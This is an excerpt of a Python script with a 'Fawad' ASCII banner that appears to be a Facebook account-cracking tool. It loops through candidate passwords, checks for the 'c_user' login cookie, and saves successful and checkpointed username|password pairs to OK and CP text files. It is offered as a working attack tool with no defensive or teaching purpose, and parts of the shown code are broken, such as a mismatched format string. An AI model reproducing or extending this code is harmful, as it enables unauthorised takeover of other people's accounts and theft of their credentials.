...
logo =                                          """   
   \033[1;37m _______    ___   ____    __    ____  ___   _______  
   \033[1;37m |  ____|  /   \  \   \  /  \  /   / /   \     |                   \ 
   \033[1;37m |  |__    /  ^  \  \   \/    \/   / /  ^  \    |  .--.              |
   \033[1;37m | __|  /  /_\  \  \            / /  /_\  \   |  |  |                |
   \033[1;37m |  |    /  _____  \  \    /\    / /  _____  \  |  '--'           |
    \033[1;37m|__|   /__/     \__\  \__/  \__/ /__/     \__\ |_____/ 
\x1b[1;97m------------------------\x1b[1;97m------------------------
...
\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             6.4.8
\033[1;37m------------------------\033[1;37m------------------------ """                                              
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mMR_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mMR_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back MR  Menu ")
	    fawad()
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [Fawad-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('Fawad_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [Fawad-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('Fawad_CP.txt' , 'a').write('%s\n' % wrt)
                        break
